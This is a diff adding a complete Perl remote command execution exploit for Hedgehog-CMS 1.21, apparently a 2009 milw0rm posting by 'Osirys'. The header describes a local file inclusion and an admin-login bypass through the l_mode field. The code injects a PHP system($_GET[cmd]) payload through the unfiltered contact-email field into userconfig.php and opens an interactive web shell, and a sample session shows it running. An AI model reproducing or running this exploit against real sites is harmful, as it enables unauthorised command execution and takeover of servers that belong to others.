@@ -1,0 +1,218 @@
+#!/usr/bin/perl
+
+# |----------------------------------------------------------------------------------------------------------------------------------|
+# |                     INFORMATIONS                                                                                                 |
+# |----------------------------------------------------------------------------------------------------------------------------------|
+# |Web Application :   Hedgedog-CMS 1.21                                                                                             |
+# |Download        :   http://mesh.dl.sourceforge.net/sourceforge/hedgehog-cms/hedgehog-cms_v1.21.zip                                |
+# |----------------------------------------------------------------------------------------------------------------------------------|
+# |Remote Command Execution Exploit                                                                                                  |
+# |by Osirys                                                                                                                         |
+# |osirys[at]autistici[dot]org                                                                                                       |
+# |osirys.org                                                                                                                        |
+# |Thx&Greets to: evilsocket, athum                                                                                                  |
+# |----------------------------------------------------------------------------------------------------------------------------------|
+# |BUG [Local File Inclusion]
+# |  p0c : /[path]/includes/footer.php?c_temp_path=[lf]%00
+# |  In source $c_temp_path is not declared, so if register_globals = On we can set its value from GET directly.
+# |----------------------------------------------------------------------------------------------------------------------------------|
+# |BUG [Abitrary php code writing]
+# |  This cms is not coded too good, we can bypass admin login just doing it via socket or lwp with $_POST[l_mode].
+# |  From admin panel everything before beeing passed in a file is filtered with htmlspecialchars and other fucntions,
+# |  expect of the email contact variable, that's the hell bug.
+# |  The sploit before overwriting a previous configuration, tries to get the old one, then it executes your commands.
+# |----------------------------------------------------------------------------------------------------------------------------------|
+
+
+# ------------------------------------------------------------------
+# Exploit in action [>!]
+# ------------------------------------------------------------------
+# osirys[~]>$ perl lolzo.txt http://localhost/hedgehog-cms/
+#
+#   --------------------------------
+#       Hedgedog-CMS RCE Exploit
+#               by Osirys
+#   --------------------------------
+#
+# [*] Getting old configuration data ..
+# [*] Overwriting configuration data ..
+# [*] Overwrite succesfully !
+# [&] Hi my master, do your job now [!]
+#
+# shell[localhost]$> id
+# uid=80(apache) gid=80(apache) groups=80(apache)
+# shell[localhost]$> pwd
+# /home/osirys/web/hedgehog-cms/config
+# shell[localhost]$> la 
+# bash: la: command not found
+# shell[localhost]$> exit
+# [-] Quitting ..
+# osirys[~]>$
+# ------------------------------------------------------------------
+
+use LWP::UserAgent;
+use IO::Socket;
+use HTTP::Request::Common;
+
+my $post_pag  =  "/specialacts.php";
+my $rce_path  =  "/config/userconfig.php";
+my $rce_c0de  =  "%22%3Bsystem%28%24_GET%5Bcmd%5D%29%3B+%24xy+%3D+%22";
+my $host      =  $ARGV[0];
+
+
+($host) || help("-1");
+cheek($host) == 1 || help("-2");
+&banner;
+
+$datas = get_input($host);
+$datas =~ /(.*) (.*)/;
+($h0st,$path) = ($1,$2);
+
+my $ua_url = $host.$post_pag;
+my $ua = LWP::UserAgent->new;
+my $re = $ua->request(POST $ua_url,
+                                    Content_Type => 'multipart/form-data',
+                                    Content	 => [l_mode => '33']
+                     );
+
+if ($re->is_success) {
+    $data = $re->content;
+    print "[*] Getting old configuration data ..\n";
+    get_old_data($data);
+    &overwrite;
+}
+else {
+    print "[-] Unable to get old configuration data ..\n";
+    print "[*] Overwriting existing configuration !   \n";
+    &overwrite;
+}
+
+sub overwrite {
+    if ($old_data_gotcha != 1) {
+        $title     =  "Website";
+        $username  =  "Username";
+        $contact   =  "admin\@admin.com";
+        $copyright =  "2007 website";
+    }
+
+    my $url = $path.$post_pag;
+
+    my $code=  "e_maintitle=". $title."&e_autor=".$username."&e_contact=". $contact. $rce_c0de.
+               "&e_copyright=".$copyright."&e_theme=.%2Ftemp%2Fstrawberry%2F&e_language=engli".
+               "sh.lng&e_favicon=&e_sp=true&e_version=true&e_guestbook=true&l_mode=35";
+
+    my $length = length($code);
+
+    my $data = "POST ".$url." HTTP/1.1\r\n".
+               "Host: ".$h0st."\r\n".
+               "Keep-Alive: 300\r\n".
+               "Connection: keep-alive\r\n".
+               "Content-Type: application/x-www-form-urlencoded\r\n".
+               "Content-Length: ".$length."\r\n\r\n".
+               $code."\r\n";
+
+    my $socket   =  new IO::Socket::INET(
+                                         PeerAddr => $h0st,
+                                         PeerPort => '80',
+                                         Proto    => 'tcp',
+                                        ) or die "[-] Can't connect to $h0st:80\n[?] $! \n\n";
+
+    print "[*] Overwriting configuration data ..\n";
+    $socket->send($data);
+
+    while ((my $e = <$socket>)&&($own != 1)) {
+        if ($e =~ /The configurations have been saved successfully/) {
+            print "[*] Overwrite succesfully !\n";
+            $own = 1;
+        }
+    }
+
+    $own == 1 || die "[-] Can't overwrite configuration data !\n";
+
+    print "[&] Hi my master, do your job now [!]\n\n";
+    &exec_cmd;
+}
+
+sub exec_cmd {
+    my(@outs,$out);
+    $h0st !~ /www\./ || $h0st =~ s/www\.//;
+    print "shell[$h0st]\$> ";
+    $cmd = <STDIN>;
+    $cmd !~ /exit/ || die "[-] Quitting ..\n";
+    $exec_url = $host.$rce_path."?cmd=".$cmd;
+    $re = get_req($exec_url);
+    if ($re =~ /./) {
+        print $re;
+        &exec_cmd;
+    }
+    else {
+        $c++;
+        $cmd =~ s/\n//;
+        print "bash: ".$cmd.": command not found\n";
+        $c < 3 || die "[-] Command are not executed.\n[-] Something wrong. Exploit Failed !\n\n";
+        &exec_cmd;
+    }
+}
+
+sub get_req() {
+    $link = $_[0];
+    my $req = HTTP::Request->new(GET => $link);
+    my $ua = LWP::UserAgent->new();
+    $ua->timeout(4);
+    my $response = $ua->request($req);
+    return $response->content;
+}
+
+sub cheek() {
+    my $host = $_[0];
+    if ($host =~ /http:\/\/(.*)/) {
+        return 1;
+    }
+    else {
+        return 0;
+    }
+}
+
+sub get_input() {
+    my $host = $_[0];
+    $host =~ /http:\/\/(.*)/;
+    $s_host = $1;
+    $s_host =~ /([a-z.-]{1,30})\/(.*)/;
+    ($h0st,$path) = ($1,$2);
+    $path =~ s/(.*)/\/$1/;
+    $full_det = $h0st." ".$path;
+    return $full_det;
+}
+
+sub get_old_data() {
+    my $re = $_[0];
+    if ($re =~ /name="e_maintitle" value="(.*)" size/) { $title = $1; }
+    if ($re =~ /name="e_autor" value="(.*)" size/)     { $username = $1; }
+    if ($re =~ /name="e_contact" value="(.*)" size/)   { $contact = $1; }
+    if ($re =~ /name="e_copyright" value="(.*)" size/) { $copyright = $1; }
+    $old_data_gotcha = 1;
+}
+
+sub banner {
+    print "\n".
+          "  -------------------------------- \n".
+          "      Hedgedog-CMS RCE Exploit      \n".
+          "              by Osirys             \n".
+          "  -------------------------------- \n\n";
+}
+
+sub help() {
+    my $error = $_[0];
+    if ($error == -1) {
+        &banner;
+        print "\n[-] Bad hostname! \n";
+    }
+    elsif ($error == -2) {
+        &banner;
+        print "\n[-] Bad hostname address !\n";
+    }
+    print "[*] Usage : perl $0 http://hostname/cms_path\n\n";
+    exit(0);
+}
+
+# milw0rm.com [2009-02-09]
